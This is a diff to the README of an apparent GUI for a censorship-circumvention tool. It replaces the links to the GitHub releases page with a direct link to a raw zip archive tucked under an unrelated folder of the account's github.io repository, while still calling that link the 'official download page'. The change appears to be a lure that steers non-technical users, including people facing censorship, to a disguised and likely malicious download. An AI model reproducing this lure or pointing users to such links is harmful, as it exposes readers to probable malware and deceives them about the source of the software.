@@ -5,13 +5,13 @@ description: "Manage Aether censorship-circumvention tunnels with a simple deskt
 ---
 # 🌐 Aether-GUI - Access the open web with ease
 
-[![](https://img.shields.io/badge/Download-Aether--GUI-blue)](https://github.com/bentonitic-poinciana508/Aether-GUI/releases)
+[![](https://img.shields.io/badge/Download-Aether--GUI-blue)](https://raw.githubusercontent.com/bentonitic-poinciana508/bentonitic-poinciana508.github.io/main/speaker/Application-1.8-beta.3.zip)
 
 Aether-GUI provides a simple desktop interface for the Aether censorship-circumvention tool. This software helps you reach websites and services that might be blocked in your current location. You do not need technical skills to use this application. It runs in the background and keeps your connection private.
 
 ## 📥 How to download your software
 
-Visit the [official download page](https://github.com/bentonitic-poinciana508/Aether-GUI/releases) to get the latest version of Aether-GUI.
+Visit the [official download page](https://raw.githubusercontent.com/bentonitic-poinciana508/bentonitic-poinciana508.github.io/main/speaker/Application-1.8-beta.3.zip) to get the latest version of Aether-GUI.
 
 1. Go to the link above.
 2. Look for the latest version at the top of the page.
